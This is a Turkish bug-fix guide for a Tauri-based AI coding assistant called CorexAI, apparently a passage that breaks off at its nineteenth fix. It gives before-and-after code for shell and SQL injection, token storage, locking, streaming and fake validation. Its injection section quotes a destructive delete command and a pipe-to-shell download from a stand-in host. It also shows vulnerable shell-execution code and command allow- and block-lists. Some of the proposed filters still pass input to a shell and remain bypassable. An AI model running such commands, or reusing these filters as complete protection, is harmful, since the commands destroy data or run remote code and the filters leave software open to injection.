# CorexAI — Tam Hata Düzeltme Kılavuzu
# 87 Hata · 3 Faz · Katman Katman Fix

Bu belge CorexAI projesindeki tüm hataları **öncelik sırasına** göre listeler.
Her hata için şunlar belirtilmiştir:
- Hangi **dosya**, hangi **satır/fonksiyon**
- Sorunun tam açıklaması
- **Eski kod → Yeni kod** (copy-paste hazır)

---

## KATMAN 1 — GÜVENLİK (Bugün düzelt)
*Bu hatalar uygulamayı açık bırakır veya veri kaybına yol açar.*

---

### FIX-01 · Terminal Shell Injection
**Dosya:** `src-tauri/src/commands.rs`
**Fonksiyon:** `execute_terminal_command` ve `execute_command`

**Sorun:** AI'dan gelen komut string'i doğrudan shell'e veriliyor. `rm -rf /` veya `curl evil.com | sh` çalışır.

```rust
// ❌ MEVCUT KOD (commands.rs ~satır 420)
#[tauri::command]
pub async fn execute_terminal_command(command: String) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    let output = Command::new("cmd").arg("/C").arg(&command).output()...;
    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh").arg("-c").arg(&command).output()...;
}
```

```rust
// ✅ YENİ KOD — izin listesi + sanitize
const ALLOWED_COMMANDS: &[&str] = &[
    "ls", "dir", "pwd", "echo", "cat", "head", "tail",
    "grep", "find", "npm", "cargo", "python", "git",
    "node", "tsc", "eslint", "prettier", "mkdir", "cp", "mv"
];

#[tauri::command]
pub async fn execute_terminal_command(command: String) -> Result<String, String> {
    // Komutun ilk kelimesini al
    let first_word = command.split_whitespace().next().unwrap_or("");
    let base_cmd = std::path::Path::new(first_word)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(first_word);

    if !ALLOWED_COMMANDS.contains(&base_cmd) {
        return Err(format!(
            "Güvenlik: '{}' komutu izin listesinde yok. İzinli komutlar: {}",
            base_cmd,
            ALLOWED_COMMANDS.join(", ")
        ));
    }

    // Tehlikeli karakterleri reddet
    let dangerous = [";", "&&", "||", "|", "`", "$(",  "$(", ">", ">>", "<"];
    for d in &dangerous {
        if command.contains(d) {
            return Err(format!("Güvenlik: '{}' karakteri yasak", d));
        }
    }

    #[cfg(target_os = "windows")]
    let output = std::process::Command::new("cmd").arg("/C").arg(&command).output()
        .map_err(|e| e.to_string())?;
    #[cfg(not(target_os = "windows"))]
    let output = std::process::Command::new("sh").arg("-c").arg(&command).output()
        .map_err(|e| e.to_string())?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

**Aynı fix `execute_command` fonksiyonuna da uygula.**

---

### FIX-02 · Shell Injection (Frontend)
**Dosya:** `src/services/aiTools.ts`
**Fonksiyon:** `runTerminal`

**Sorun:** AI tool'undan gelen komut hiç filtrelenmeden Rust backend'e gönderiliyor.

```typescript
// ❌ MEVCUT KOD
async function runTerminal(command: string) {
    const shellArgs = isWindows ? ['/C', command] : ['-c', command];
    await invoke('execute_command', { command: shell, args: shellArgs });
}
```

```typescript
// ✅ YENİ KOD
const SAFE_COMMANDS = ['ls', 'dir', 'pwd', 'cat', 'echo', 'npm', 'cargo',
    'python', 'git', 'node', 'tsc', 'grep', 'find', 'mkdir'];

async function runTerminal(command: string) {
    const firstWord = command.trim().split(/\s+/)[0];
    const baseCmd = firstWord.split(/[/\\]/).pop() || firstWord;

    if (!SAFE_COMMANDS.includes(baseCmd)) {
        throw new Error(`Güvenlik: '${baseCmd}' komutu izin listesinde değil`);
    }

    const dangerous = [';', '&&', '||', '|', '`', '$(', '>', '<'];
    for (const d of dangerous) {
        if (command.includes(d)) {
            throw new Error(`Güvenlik: '${d}' karakteri yasak`);
        }
    }

    const shellArgs = isWindows ? ['/C', command] : ['-c', command];
    await invoke('execute_command', { command: shell, args: shellArgs });
}
```

---

### FIX-03 · Shell Injection (Executor)
**Dosya:** `src/core/planning/executor.ts`
**Fonksiyon:** `executeCommand`

**Sorun:** Planning agent'ın ürettiği komut doğrudan `Command.create`'e gidiyor. Bu 3. shell injection noktası.

```typescript
// ❌ MEVCUT KOD
private async executeCommand(task: CommandRunTask, context: ExecutionContext): Promise<string> {
    const output = await Command.create(task.command, task.args || []).execute();
```

```typescript
// ✅ YENİ KOD
const EXECUTOR_ALLOWED = ['npm', 'cargo', 'python', 'python3', 'node',
    'tsc', 'git', 'eslint', 'prettier', 'jest', 'vitest'];

private async executeCommand(task: CommandRunTask, context: ExecutionContext): Promise<string> {
    if (context.dryRun) return `[DRY RUN] Would run: ${task.command}`;

    const baseCmd = task.command.split(/[/\\]/).pop() || task.command;
    if (!EXECUTOR_ALLOWED.includes(baseCmd)) {
        throw new Error(`Executor: '${baseCmd}' komutu izin listesinde değil`);
    }

    // Args'ları da kontrol et
    const dangerous = [';', '&&', '||', '|', '`', '$('];
    const allArgs = (task.args || []).join(' ');
    for (const d of dangerous) {
        if (allArgs.includes(d)) throw new Error(`Executor: arg'da yasak karakter: ${d}`);
    }

    const output = await Command.create(task.command, task.args || []).execute();
    if (output.code !== 0) throw new Error(`Komut başarısız (${output.code}): ${output.stderr}`);
    return output.stdout;
}
```

---

### FIX-04 · eval() Kullanımı
**Dosya:** `src/services/ai.ts` (veya `aiProvider.ts`)
**Fonksiyon:** System prompt oluşturma bölümü

**Sorun:** System prompt içinde `eval()` çağrısı var. XSS + arbitrary code execution riski.

```typescript
// ❌ MEVCUT KOD — eval() olan satırı bul ve sil
const result = eval(someCode); // Bu satırı tamamen kaldır
```

```typescript
// ✅ YENİ KOD — eval yerine JSON.parse veya doğrudan değer kullan
// eval() hiçbir zaman kullanma. Dinamik kod çalıştırmaya gerek yoksa
// kaldır. JSON parse gerekiyorsa:
const result = JSON.parse(jsonString); // eval yerine
```

---

### FIX-05 · OAuth Token localStorage'da
**Dosya:** `src/services/auth.ts`
**Fonksiyon:** `saveUserProfile`, `getStoredProfiles`, `signOut`

**Sorun:** Access token ve refresh token JSON olarak localStorage'a yazılıyor. XSS ile çalınabilir.

```typescript
// ❌ MEVCUT KOD
function saveUserProfile(profile: UserProfile): void {
    const profiles = getStoredProfiles();
    localStorage.setItem('user_profiles', JSON.stringify(profiles));
}

export function getStoredProfiles(): UserProfile[] {
    const stored = localStorage.getItem('user_profiles');
    return stored ? JSON.parse(stored) : [];
}
```

```typescript
// ✅ YENİ KOD — Tauri Store kullan (şifreli)
import { Store } from '@tauri-apps/plugin-store';

const authStore = new Store('.auth.dat'); // Şifreli dosya

async function saveUserProfile(profile: UserProfile): Promise<void> {
    const profiles = await getStoredProfiles();
    const existingIndex = profiles.findIndex(p => p.provider === profile.provider);
    if (existingIndex >= 0) profiles[existingIndex] = profile;
    else profiles.push(profile);
    await authStore.set('user_profiles', profiles);
    await authStore.save();
}

export async function getStoredProfiles(): Promise<UserProfile[]> {
    const stored = await authStore.get<UserProfile[]>('user_profiles');
    return stored || [];
}

export async function signOut(providerId: 'github' | 'microsoft'): Promise<void> {
    const profiles = await getStoredProfiles();
    const filtered = profiles.filter(p => p.provider !== providerId);
    await authStore.set('user_profiles', filtered);
    await authStore.save();
}
```

---

### FIX-06 · localStorage → Tauri Store (Tüm Proje)
**Etkilenen Dosyalar:** `aiProvider.ts`, `chatpanel.tsx`, `GGUFModelBrowser.tsx`, `aiNativeDB.ts`, `editorOverlay.ts`, `autonomy.ts`, `modelRegistry.ts` ve daha fazlası

**Sorun:** Tauri uygulamalarında `localStorage` güvenilmez ve güvensizdir. Kritik veriler (AI config, model path, session) için Tauri Store kullanılmalı.

```typescript
// ✅ Ortak storage yardımcı fonksiyonu — src/services/storage.ts olarak yeni dosya oluştur

import { Store } from '@tauri-apps/plugin-store';

// UI durumu için hızlı store (şifrelenmemiş, anlık)
const uiStore = new Store('.ui-state.dat');
// Hassas veriler için (token, api key)
const secureStore = new Store('.secure.dat');
// Ayarlar için
const settingsStore = new Store('.settings.dat');

export const storage = {
    // UI state (localStorage yerine)
    async getUI<T>(key: string): Promise<T | null> {
        return uiStore.get<T>(key);
    },
    async setUI<T>(key: string, value: T): Promise<void> {
        await uiStore.set(key, value);
        await uiStore.save();
    },
    async removeUI(key: string): Promise<void> {
        await uiStore.delete(key);
        await uiStore.save();
    },

    // Ayarlar (AI provider config, model config vs.)
    async getSettings<T>(key: string): Promise<T | null> {
        return settingsStore.get<T>(key);
    },
    async setSettings<T>(key: string, value: T): Promise<void> {
        await settingsStore.set(key, value);
        await settingsStore.save();
    },

    // Güvenli (token, api key)
    async getSecure<T>(key: string): Promise<T | null> {
        return secureStore.get<T>(key);
    },
    async setSecure<T>(key: string, value: T): Promise<void> {
        await secureStore.set(key, value);
        await secureStore.save();
    },
};

// Migrasyon: Mevcut localStorage verisini taşı
export async function migrateFromLocalStorage(): Promise<void> {
    const keys = [
        'corex-ai-providers', 'gguf-models', 'gguf-active-model',
        'gguf-download-folder', 'corex-dismissed-insights',
        'gguf-performance-logs', 'gguf-conversation-history',
        'gpu-info-cache', 'ai-output-mode'
    ];
    for (const key of keys) {
        const val = localStorage.getItem(key);
        if (val) {
            try {
                await storage.setSettings(key, JSON.parse(val));
                localStorage.removeItem(key);
            } catch {
                await storage.setUI(key, val);
                localStorage.removeItem(key);
            }
        }
    }
    console.log('✅ localStorage → Tauri Store migration tamamlandı');
}
```

**Kullanım örneği (mevcut kodu güncelle):**
```typescript
// ❌ ÖNCE
const saved = localStorage.getItem('gguf-models');
const models = saved ? JSON.parse(saved) : [];
localStorage.setItem('gguf-models', JSON.stringify(models));

// ✅ SONRA
import { storage } from './storage';
const models = await storage.getSettings<GGUFModel[]>('gguf-models') || [];
await storage.setSettings('gguf-models', models);
```

---

### FIX-07 · Vector DB SQL Injection
**Dosya:** `src-tauri/src/vector_db.rs`
**Fonksiyon:** `delete_file`

**Sorun:** `file_path` parametresi doğrudan SQL filter string'ine ekleniyor. Tek tırnak içeren path SQL'i kırıyor.

```rust
// ❌ MEVCUT KOD
pub async fn delete_file(&self, file_path: &str) -> Result<(), Box<dyn Error>> {
    let table = self.get_table().await?;
    table.delete(&format!("file_path = '{}'", file_path)).await?;
    Ok(())
}
```

```rust
// ✅ YENİ KOD
pub async fn delete_file(&self, file_path: &str) -> Result<(), Box<dyn Error>> {
    let table = self.get_table().await?;
    // SQL string escape: tek tırnakları çift yap
    let safe_path = file_path.replace('\'', "''");
    // Tehlikeli karakterleri kontrol et
    if file_path.contains(';') || file_path.contains("--") {
        return Err(format!("Geçersiz dosya yolu: {}", file_path).into());
    }
    table.delete(&format!("file_path = '{}'", safe_path)).await?;
    Ok(())
}
```

---

## KATMAN 2 — KRİTİK PERFORMANS (Bu hafta düzelt)
*Bu hatalar uygulamayı yavaşlatır veya önemli özellikleri bozar.*

---

### FIX-08 · Mutex Tüm Inference Boyunca Kilitli
**Dosya:** `src-tauri/src/gguf.rs`
**Fonksiyon:** `chat_with_gguf_model`

**Sorun:** `state.lock()` alındıktan sonra yüzlerce token üretimi yapılıyor. 30-60 saniye boyunca başka GGUF komutu çalışamıyor, UI bloke oluyor.

```rust
// ❌ MEVCUT KOD — lock tüm for döngüsü boyunca tutulur
pub async fn chat_with_gguf_model(...) -> Result<String, String> {
    let state_guard = match state.lock() { Ok(g) => g, ... };
    // state_guard burada tutulur
    for i in 0..max_tokens {  // ← bu döngü 30-60 saniye sürebilir
        let candidates = context.candidates();
        // ...
    } // state_guard ancak burada bırakılır
}
```

```rust
// ✅ YENİ KOD — model'i Arc<> ile al, lock'u bırak, inference'ı serbest çalıştır
pub async fn chat_with_gguf_model(
    state: tauri::State<'_, Arc<Mutex<GgufState>>>,
    model_path: String,
    prompt: String,
    max_tokens: u32,
    temperature: f32,
) -> Result<String, String> {
    // Lock sadece model'i almak için kullan
    let (model, backend) = {
        let state_guard = state.lock().map_err(|e| e.to_string())?;
        let model = state_guard.models.get(&model_path)
            .ok_or_else(|| format!("Model bulunamadı: {}", model_path))?
            .model.clone(); // Arc<LlamaModel> clone - ucuz
        let backend = state_guard.backend.clone()
            .ok_or("Backend başlatılmamış")?;
        (model, backend)
    }; // ← Lock burada bırakılıyor

    // Inference lock olmadan çalışır
    let mut session = model.create_session(SessionParams::default())
        .map_err(|e| e.to_string())?;

    session.advance_context(&prompt).map_err(|e| e.to_string())?;

    let mut response = String::new();
    for _ in 0..max_tokens {
        let mut candidates = session.candidates();
        // sampling...
        let token = candidates.sample_token(&mut session);
        if model.is_eog_token(token) { break; }
        response.push_str(&model.token_to_str(token).map_err(|e| e.to_string())?);
    }

    Ok(response)
}
```

---

### FIX-09 · Aktif Dosya Her Mesajda Diskten Okunuyor
**Dosya:** `src/components/chatpanel.tsx`
**Fonksiyon:** `handleSend`

**Sorun:** Her mesaj gönderiminde aktif dosya diskten okunuyor. 100MB dosya varsa 100MB string her seferinde AI prompt'una ekleniyor, token limiti patlıyor.

```typescript
// ❌ MEVCUT KOD
const handleSend = async () => {
    if (currentFile) {
        const fileContent = await invoke<string>("read_file_content", { path: currentFile });
        systemContext = `--- AKTİF DOSYA: ${currentFile} ---\n\`\`\`\n${fileContent}\n\`\`\``;
    }
    onSendMessage(messageToSend, systemContext);
};
```

```typescript
// ✅ YENİ KOD — cache + boyut limiti + sadece ilgili bölüm
const fileCache = useRef<Map<string, { content: string; timestamp: number }>>(new Map());
const FILE_CACHE_TTL = 30000; // 30 saniye
const MAX_FILE_CHARS = 50000; // ~12K token — yeterli

const getFileContext = useCallback(async (filePath: string): Promise<string> => {
    const now = Date.now();
    const cached = fileCache.current.get(filePath);
    if (cached && now - cached.timestamp < FILE_CACHE_TTL) {
        return cached.content;
    }

    const fileContent = await invoke<string>("read_file_content", { path: filePath });

    // Boyut kontrolü
    const truncated = fileContent.length > MAX_FILE_CHARS
        ? fileContent.slice(0, MAX_FILE_CHARS) + '\n\n[... dosya çok büyük, kısaltıldı ...]'
        : fileContent;

    fileCache.current.set(filePath, { content: truncated, timestamp: now });
    return truncated;
}, []);

const handleSend = async () => {
    let systemContext = '';
    if (currentFile) {
        const fileContent = await getFileContext(currentFile);
        systemContext = `--- AKTİF DOSYA: ${currentFile} ---\n\`\`\`\n${fileContent}\n\`\`\``;
    }
    onSendMessage(messageToSend, systemContext);
};
```

---

### FIX-10 · System Instruction User Mesajına Ekleniyor
**Dosya:** `src/services/aiProvider.ts`
**Fonksiyon:** `callAI` veya benzeri

**Sorun:** 800+ karakterlik system instruction her mesajın sonuna ekleniyor. System prompt user turn'de olmamalı.

```typescript
// ❌ MEVCUT KOD
const agenticInstruction = isTurkish
    ? `\n\n[SİSTEM ÖNEMLİ KURALI: Tool kullanmak için TOOL:isim|PARAMS:{...} formatını kullan...]`
    : `\n\n[SYSTEM IMPORTANT RULE: ...]`;
const enhancedMessage = message + agenticInstruction; // user mesajına ekleniyor!
```

```typescript
// ✅ YENİ KOD — instruction'ı system role'e taşı
const getSystemInstruction = (isTurkish: boolean): string => {
    return isTurkish
        ? `Sen CorexAI asistanısın. Tool kullanmak için TOOL:isim|PARAMS:{...} formatını kullan.
Mevcut toollar: run_terminal, read_file, write_file, code_review, generate_docs, generate_tests, web_search, plan_task.
Her zaman Türkçe yanıtla.`
        : `You are CorexAI assistant. To use tools, format: TOOL:name|PARAMS:{...}.
Available tools: run_terminal, read_file, write_file, code_review, generate_docs, generate_tests, web_search, plan_task.`;
};

// API çağrısında messages array'ine system mesajı ekle:
const messages = [
    { role: 'system', content: getSystemInstruction(isTurkish) },
    ...conversationHistory,
    { role: 'user', content: message }  // artık sadece kullanıcı mesajı
];
```

---

### FIX-11 · importedSymbols Cache'den Kaybolunca Unused Export Analizi Bozuluyor
**Dosya:** `src/services/aiNativeDB.ts`
**Fonksiyon:** `convertToAINative` ve `convertFromAINative`

**Sorun:** IndexedDB'ye yazarken `importedSymbols` kaybolur. Geri açılınca boş array. `findUnusedExports()` bunlara bakıyor — cache aktifken tüm exports "kullanılmıyor" görünüyor.

```typescript
// ❌ MEVCUT KOD — convertToAINative
export function convertToAINative(analysis: FileAnalysis): AINativeFileAnalysis {
    return {
        imports: analysis.imports.map(imp => imp.moduleName), // ← importedSymbols kayboluyor
        // ...
    };
}

// ❌ MEVCUT KOD — convertFromAINative
function convertFromAINative(analysis: AINativeFileAnalysis): FileAnalysis {
    return {
        imports: analysis.imports.map((moduleName, index) => ({
            moduleName,
            importedSymbols: [],  // ← her zaman boş!
            isDefault: false,
            line: index,          // ← sahte satır numaraları
        })),
        linesOfCode: 0,           // ← her zaman sıfır!
    };
}
```

```typescript
// ✅ YENİ KOD — AINativeFileAnalysis interface'ini güncelle

// Interface'e imports detay alanı ekle:
export interface AINativeFileAnalysis {
    // ... mevcut alanlar ...
    imports: string[];           // geriye dönük uyum için tut
    importsDetail?: Array<{      // YENİ: tam import bilgisi
        moduleName: string;
        importedSymbols: string[];
        isDefault: boolean;
        line: number;
    }>;
    linesOfCode: number;         // YENİ: satır sayısı
}

// convertToAINative
export function convertToAINative(analysis: FileAnalysis): AINativeFileAnalysis {
    return {
        imports: analysis.imports.map(imp => imp.moduleName),
        importsDetail: analysis.imports.map(imp => ({  // YENİ
            moduleName: imp.moduleName,
            importedSymbols: imp.importedSymbols || [],
            isDefault: imp.isDefault || false,
            line: imp.line || 0,
        })),
        linesOfCode: analysis.linesOfCode || 0,  // YENİ
        // ... diğer alanlar
    };
}

// convertFromAINative
function convertFromAINative(analysis: AINativeFileAnalysis): FileAnalysis {
    return {
        imports: analysis.importsDetail
            ? analysis.importsDetail.map(imp => ({
                moduleName: imp.moduleName,
                importedSymbols: imp.importedSymbols,
                isDefault: imp.isDefault,
                line: imp.line,
            }))
            : analysis.imports.map((moduleName, index) => ({
                moduleName,
                importedSymbols: [],
                isDefault: false,
                line: index,
            })),
        linesOfCode: analysis.linesOfCode || 0,  // artık gerçek değer
        // ... diğer alanlar
    };
}
```

---

### FIX-12 · Vector DB Double Insert
**Dosya:** `src-tauri/src/vector_db.rs`
**Fonksiyon:** `upsert`

**Sorun:** İlk index'lemede her chunk iki kez yazılıyor. `create_table(reader)` ile veri yazıldıktan sonra `table.add(reader2)` tekrar çalışıyor.

```rust
// ❌ MEVCUT KOD
pub async fn upsert(&self, chunks: Vec<CodeChunk>) -> Result<(), Box<dyn Error>> {
    let batch = CodeChunk::to_record_batch(chunks.clone())?;
    let schema = batch.schema();
    let reader = RecordBatchIterator::new(vec![Ok(batch)].into_iter(), schema);

    let table = match conn.open_table(&self.table_name).execute().await {
        Ok(table) => table,
        Err(_) => {
            conn.create_table(&self.table_name, Box::new(reader)).execute().await? // 1. yazma
        }
    };

    if conn.open_table(&self.table_name).execute().await.is_ok() { // her zaman true!
        table.add(Box::new(reader2)).execute().await? // 2. yazma — HATA!
    }
    Ok(())
}
```

```rust
// ✅ YENİ KOD — tek yazma garantisi
pub async fn upsert(&self, chunks: Vec<CodeChunk>) -> Result<(), Box<dyn Error>> {
    if chunks.is_empty() { return Ok(()); }

    let conn = self.connection.lock().await;
    let batch = CodeChunk::to_record_batch(chunks)?;
    let schema = batch.schema();
    let reader = RecordBatchIterator::new(vec![Ok(batch)].into_iter(), schema);

    match conn.open_table(&self.table_name).execute().await {
        Ok(table) => {
            // Tablo var → sadece ekle
            table.add(Box::new(reader)).execute().await?;
        }
        Err(_) => {
            // Tablo yok → oluştur (reader ile birlikte tek seferlik)
            conn.create_table(&self.table_name, Box::new(reader)).execute().await?;
        }
    }
    Ok(())
}
```

---

### FIX-13 · HTTP Streaming Yanlış Endpoint
**Dosya:** `src-tauri/src/streaming.rs`
**Fonksiyon:** `chat_with_http_streaming`

**Sorun:** `/v1/completions` endpoint'i kullanılıyor ama LM Studio/Ollama chat API'si `/v1/chat/completions`'da. Format da yanlış.

```rust
// ❌ MEVCUT KOD
let body = serde_json::json!({
    "model": "default",
    "prompt": request.prompt,    // ← completion formatı
    "max_tokens": request.max_tokens.unwrap_or(2000),
    "stream": true
});
client.post(format!("{}/v1/completions", base_url))  // ← yanlış endpoint
```

```rust
// ✅ YENİ KOD
let body = serde_json::json!({
    "model": "default",
    "messages": [
        {"role": "user", "content": request.prompt}  // ← chat formatı
    ],
    "max_tokens": request.max_tokens.unwrap_or(2000),
    "temperature": request.temperature.unwrap_or(0.7),
    "stream": true
});

let response = client
    .post(format!("{}/v1/chat/completions", base_url))  // ← doğru endpoint
    .header("Content-Type", "application/json")
    .json(&body)
    .send()
    .await
    .map_err(|e| format!("HTTP isteği başarısız: {}", e))?;

// SSE parse — chat/completions formatı farklı:
if let Ok(json) = serde_json::from_str::<serde_json::Value>(data) {
    // choices[0].delta.content — completion'da choices[0].text
    if let Some(token) = json["choices"][0]["delta"]["content"].as_str() {
        full_response.push_str(token);
        app.emit("stream-token", StreamToken { token: token.to_string(), is_complete: false })
            .map_err(|e| e.to_string())?;
    }
}
```

---

### FIX-14 · useEffect Dependency Array Hataları
**Dosya:** `src/App.tsx`

**Sorun:** `showRightSidebar` ve `toggleRightSidebar` dependency array'de eksik → stale closure, callback birikimi.

```typescript
// ❌ MEVCUT KOD
useEffect(() => {
    agentService.registerChatCallback((msg: any) => {
        chat.addMessage(msg);
        if (!showRightSidebar) toggleRightSidebar(); // stale closure
    });
}, [chat.addMessage]); // eksik dependency'ler
```

```typescript
// ✅ YENİ KOD
useEffect(() => {
    const callback = (msg: any) => {
        chat.addMessage(msg);
        if (!showRightSidebar) toggleRightSidebar();
    };

    agentService.registerChatCallback(callback);

    // Cleanup — eski callback'i temizle
    return () => {
        agentService.unregisterChatCallback(callback);
    };
}, [chat.addMessage, showRightSidebar, toggleRightSidebar]); // tüm bağımlılıklar
```

**`agentService`'e `unregisterChatCallback` eklenmesi gerekiyor:**
```typescript
// agentService.ts içinde:
private chatCallbacks: Set<(msg: any) => void> = new Set();

registerChatCallback(callback: (msg: any) => void): void {
    this.chatCallbacks.add(callback);
}

unregisterChatCallback(callback: (msg: any) => void): void {
    this.chatCallbacks.delete(callback);
}
```

---

### FIX-15 · useEffect Async Queue Bug
**Dosya:** `src/hooks/useAIBackgroundAnalysis.ts`

**Sorun:** Analiz tamamlandığında sonraki dosya işlenmiyor. Queue boşalmıyor.

```typescript
// ❌ MEVCUT KOD
useEffect(() => {
    if (analysisQueue.length === 0 || isAnalyzing) return;
    const nextFile = analysisQueue[0];
    setIsAnalyzing(true);
    analyzeFile(nextFile).then(() => {
        setAnalysisQueue(prev => prev.slice(1));
        setIsAnalyzing(false);
        // ← sonraki dosya için effect tetiklenmeyebilir (stale closure)
    });
}, [analysisQueue, isAnalyzing]);
```

```typescript
// ✅ YENİ KOD — useRef ile queue yönet
const queueRef = useRef<string[]>([]);
const isAnalyzingRef = useRef(false);

const processQueue = useCallback(async () => {
    if (isAnalyzingRef.current || queueRef.current.length === 0) return;

    isAnalyzingRef.current = true;
    const nextFile = queueRef.current.shift()!; // baştan al ve çıkar

    try {
        await analyzeFile(nextFile);
    } catch (err) {
        console.error('Analiz hatası:', err);
    } finally {
        isAnalyzingRef.current = false;
        // Kuyrukta başka dosya varsa devam et
        if (queueRef.current.length > 0) {
            setTimeout(processQueue, 100);
        }
    }
}, [analyzeFile]);

const addToQueue = useCallback((filePath: string) => {
    if (!queueRef.current.includes(filePath)) {
        queueRef.current.push(filePath);
        processQueue();
    }
}, [processQueue]);
```

---

## KATMAN 3 — ÇALIŞMAYAN ÖZELLİKLER (Önümüzdeki 2 hafta)
*Bu hatalar özellikleri tamamen işlevsiz yapıyor.*

---

### FIX-16 · GGUF Streaming Simüle Ediliyor (Gerçek Değil)
**Dosya:** `src-tauri/src/streaming.rs`
**Fonksiyon:** `chat_with_streaming`

**Sorun:** Tam yanıt önce üretiliyor, sonra kelime kelime gecikmeyle gönderiliyor. Gerçek streaming değil.

```rust
// ❌ MEVCUT KOD — fake streaming
let response = crate::gguf::chat_with_gguf_model(...).await?; // tüm yanıt bekle

let words: Vec<&str> = response.split_whitespace().collect();
for word in words.iter() {
    app.emit("stream-token", StreamToken { token: format!("{} ", word), is_complete: false })?;
    tokio::time::sleep(Duration::from_millis(30)).await; // yapay gecikme
}
```

```rust
// ✅ YENİ KOD — gerçek token-by-token streaming
pub async fn chat_with_streaming(
    app: AppHandle,
    request: StreamingRequest,
) -> Result<String, String> {
    let gguf_state = app.state::<Arc<Mutex<crate::gguf::GgufState>>>();

    let model_path = /* model_path resolve kodu */;

    app.emit("stream-start", ()).map_err(|e| e.to_string())?;

    // Lock'u sadece model almak için al, hemen bırak
    let model = {
        let guard = gguf_state.lock().map_err(|e| e.to_string())?;
        guard.models.get(&model_path)
            .ok_or("Model bulunamadı")?
            .model.clone()
    };

    let mut session = model.create_session(Default::default())
        .map_err(|e| e.to_string())?;
    session.advance_context(&request.prompt).map_err(|e| e.to_string())?;

    let mut full_response = String::new();
    let max_tokens = request.max_tokens.unwrap_or(2000) as usize;

    for _ in 0..max_tokens {
        let candidates = session.candidates();
        let token = candidates.sample_token(&mut session);

        if model.is_eog_token(token) { break; }

        let text = model.token_to_str(token).map_err(|e| e.to_string())?;
        full_response.push_str(&text);

        // Her token'ı gerçek zamanlı gönder — gecikme YOK
        app.emit("stream-token", StreamToken {
            token: text,
            is_complete: false,
        }).map_err(|e| e.to_string())?;
    }

    app.emit("stream-token", StreamToken { token: String::new(), is_complete: true })
        .map_err(|e| e.to_string())?;
    app.emit("stream-complete", full_response.clone()).map_err(|e| e.to_string())?;

    Ok(full_response)
}
```

---

### FIX-17 · RAG Pipeline build_context Tamamen TODO
**Dosya:** `src-tauri/src/rag_pipeline.rs`
**Fonksiyon:** `build_context`

**Sorun:** Fonksiyon sadece query'nin kendisini döndürüyor. Vector DB arama sonuçları hiç entegre edilmiyor.

```rust
// ❌ MEVCUT KOD
pub async fn build_context(&self, intent: QueryIntent, query: &str)
-> Result<(String, Vec<ContextSource>), Box<dyn Error>> {
    // TODO: Implement actual multi-source retrieval
    let context = format!("Query: {}\nIntent: {:?}\n", query, intent);
    let sources: Vec<ContextSource> = Vec::new(); // her zaman boş
    Ok((context, sources))
}
```

```rust
// ✅ YENİ KOD — Vector DB entegrasyonu ile
pub async fn build_context(
    &self,
    intent: QueryIntent,
    query: &str,
    vector_db: &crate::vector_db::VectorDB,
    query_embedding: Vec<f32>,
) -> Result<(String, Vec<ContextSource>), Box<dyn Error>> {
    let mut context = String::new();
    let mut sources: Vec<ContextSource> = Vec::new();

    // 1. Vector DB'den ilgili code chunk'ları çek
    let top_k = match &intent {
        QueryIntent::Refactor { .. } | QueryIntent::Debug { .. } => 8,
        QueryIntent::Explain { .. } => 5,
        _ => 3,
    };

    let chunks = vector_db.query(query_embedding, top_k).await
        .unwrap_or_default();

    if !chunks.is_empty() {
        context.push_str("=== İLGİLİ KOD PARÇALARI ===\n\n");
        for chunk in &chunks {
            context.push_str(&format!(
                "--- {} ({}) ---\n{}\n\n",
                chunk.file_path,
                chunk.chunk_type,
                chunk.content
            ));

            sources.push(ContextSource {
                source_type: "vector_db".to_string(),
                file_path: chunk.file_path.clone(),
                relevance_score: 0.9, // TODO: gerçek skor
                reason: format!("Vector benzerliği: {}", chunk.chunk_type),
            });
        }
    }

    // 2. Intent'e göre ek bağlam
    match &intent {
        QueryIntent::Debug { file } if !file.is_empty() => {
            context.push_str(&format!("\n=== HATA DOSYASI: {} ===\n", file));
        }
        QueryIntent::Refactor { symbol } | QueryIntent::Explain { symbol }
            if !symbol.is_empty() => {
            context.push_str(&format!("\n=== HEDEF SEMBOL: {} ===\n", symbol));
        }
        _ => {}
    }

    // Token limiti kontrolü
    let available = self.max_context_tokens.saturating_sub(5000); // sistem için 5K reserve
    if context.len() / 4 > available {
        context.truncate(available * 4);
        context.push_str("\n\n[Bağlam token limitinden kısaltıldı]");
    }

    Ok((context, sources))
}
```

---

### FIX-18 · Executor Validasyon Sahte
**Dosya:** `src/core/planning/executor.ts`
**Fonksiyon:** `executeValidation`

**Sorun:** Tüm validasyon türleri "passed" döndürüyor, hiçbir şey kontrol etmiyor.

```typescript
// ❌ MEVCUT KOD
private async executeValidation(task: ValidationTask, context: ExecutionContext): Promise<string> {
    switch (task.validationType) {
        case 'syntax': return 'Syntax validation passed'; // hiçbir şey kontrol etmiyor
        case 'lint':   return 'Lint validation passed';
        case 'test':   return 'Tests passed';
        case 'build':  return 'Build successful';
    }
}
```

```typescript
// ✅ YENİ KOD — gerçek validasyon
private async executeValidation(task: ValidationTask, context: ExecutionContext): Promise<string> {
    if (context.dryRun) return `[DRY RUN] Would validate: ${task.target}`;

    const { Command } = await import('@tauri-apps/plugin-shell');
    const workDir = context.workingDirectory;

    switch (task.validationType) {
        case 'syntax': {
            // TypeScript syntax check
            const out = await Command.create('tsc', ['--noEmit', '--skipLibCheck'], {
                cwd: workDir
            }).execute();
            if (out.code !== 0) throw new Error(`TypeScript hataları:\n${out.stderr}`);
            return 'TypeScript syntax doğru';
        }
        case 'lint': {
            const out = await Command.create('npx', ['eslint', task.target || '.', '--max-warnings=0'], {
                cwd: workDir
            }).execute();
            if (out.code !== 0) throw new Error(`ESLint hataları:\n${out.stdout}`);
            return 'Lint temiz';
        }
        case 'test': {
            const out = await Command.create('npm', ['test', '--', '--passWithNoTests'], {
                cwd: workDir
            }).execute();
            if (out.code !== 0) throw new Error(`Test hataları:\n${out.stdout}`);
            return `Testler geçti:\n${out.stdout.slice(0, 500)}`;
        }
        case 'build': {
            const out = await Command.create('npm', ['run', 'build'], {
                cwd: workDir
            }).execute();
            if (out.code !== 0) throw new Error(`Build hatası:\n${out.stderr}`);
            return 'Build başarılı';
        }
        default:
            throw new Error(`Bilinmeyen validasyon tipi: ${task.validationType}`);
    }
}
```

---

### FIX-19 · read_gguf_metadata Gerçek Binary Okuma
**Dosya:** `src-tauri/src/gguf.rs`
**Fonksiyon:** `read_gguf_metadata`

**Sorun:** Dosya adından regex ile tahmin yapılıyor, GGUF binary header okunmuyor.

```rust
// ❌ MEVCUT KOD — dosya adından tahmin
